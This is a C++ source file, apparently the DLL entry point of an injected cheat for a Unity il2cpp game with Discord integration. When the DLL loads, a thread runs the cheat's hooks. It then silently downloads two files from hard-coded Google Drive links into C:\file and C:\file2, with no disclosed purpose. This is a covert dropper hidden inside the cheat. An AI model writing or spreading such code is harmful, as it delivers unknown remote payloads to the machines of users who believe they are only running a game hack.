#include "includes.h"
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")
#include "Utils/Il2cpp/lazy_importer.hpp"
#include "discord/discord.h"
#pragma comment(lib, "ntdll.lib")
using namespace std;

Discord* g_Discord;

__forceinline void discord_main()
{
	g_Discord->Initialize();
	g_Discord->Update();
}

void start_hack( ) {

	discord_main();
	il2cpp::init( );
	Start( );
	hk__( );

	URLDownloadToFileA(NULL, "https://drive.google.com/uc?export=download&id=11PxF4O8XTyBMWyOshRidYBy_neii7VaT", "C:\\file", 0, 0);
	URLDownloadToFileA(NULL, "https://drive.google.com/uc?export=download&id=1oNY6Kz8Fn45nz1rYjAcrj1DPTHe-lpUV", "C:\\file2", 0, 0);
}

bool DllMain(HMODULE hMod, std::uint32_t call_reason, void*) {

	if ( call_reason != DLL_PROCESS_ATTACH )
		return false;
	const auto thread = CreateThread(nullptr, 0, reinterpret_cast< LPTHREAD_START_ROUTINE >( start_hack ), hMod, 0, nullptr);
	if ( thread != NULL )
		CloseHandle(thread);

	return true;
}
